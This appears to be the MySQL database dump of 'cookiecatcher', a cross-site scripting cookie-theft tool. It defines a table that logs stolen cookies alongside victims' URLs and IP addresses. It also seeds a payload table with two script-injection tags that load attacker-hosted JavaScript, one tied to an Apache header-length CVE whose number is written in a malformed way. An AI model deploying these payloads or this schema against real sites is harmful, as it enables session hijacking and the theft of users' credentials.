-- ------------------------------------------------------
-- Database: cookiecatcher
-- ------------------------------------------------------

--
-- Table structure for table `cookies`
--

DROP TABLE IF EXISTS `cookies`;
CREATE TABLE `cookies` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(100) DEFAULT NULL,
  `cookiedata` text,
  `ip` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=130 DEFAULT CHARSET=latin1;

--
-- Table structure for table `payloads`
--

DROP TABLE IF EXISTS `payloads`;
CREATE TABLE `payloads` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `payload` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

INSERT INTO `payloads` VALUES (1,'#2 Apache Header Length (CVE-201200053)','<script src=\'{siteURL}y.js\'></script>'),(2,'#1 Default AJAX Attack','<script src=\'{siteURL}x.js\'></script>');
